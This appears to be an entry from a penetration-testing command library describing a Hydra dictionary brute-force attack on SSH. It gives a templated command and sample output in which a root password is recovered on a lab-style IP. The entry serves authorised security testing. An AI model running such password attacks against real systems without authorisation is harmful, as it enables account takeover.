---
id: fbc4c3b4-38ce-44be-9563-7480045f3ccf
name: Hydra Dictionary Brute Force SSH
type: command
executor: ''
data: hydra -L $_USER_LIST -P $_WORDLIST ssh://$TARGET_IP
output: 'root@kali:~# hydra -L users.txt -P wordlist.txt ssh://10.10.10.10

  Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret
  service organizations, or for illegal purposes.

  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 20:47:15

  [DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999),
  ~63 tries per task

  [DATA] attacking ssh://10.10.10.10:22/

  [22][ssh] host: 10.10.10.10   login: root   password: secret!!!

  [STATUS] 999.00 tries/min, 999 tries in 00:01h, 2 to do in 00:01h, 4 active

  1 of 1 target successfully completed, 1 valid password found

  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-24 20:48:44'
created_at: '2019-09-25T02:38:27.478618+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Hydra Dictionary Brute Force SSH

```bash
hydra -L $_USER_LIST -P $_WORDLIST ssh://$TARGET_IP
```

## Expected Output

```
root@kali:~# hydra -L users.txt -P wordlist.txt ssh://10.10.10.10
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 20:47:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999), ~63 tries per task
[DATA] attacking ssh://10.10.10.10:22/
[22][ssh] host: 10.10.10.10   login: root   password: secret!!!
[STATUS] 999.00 tries/min, 999 tries in 00:01h, 2 to do in 00:01h, 4 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-24 20:48:44
```
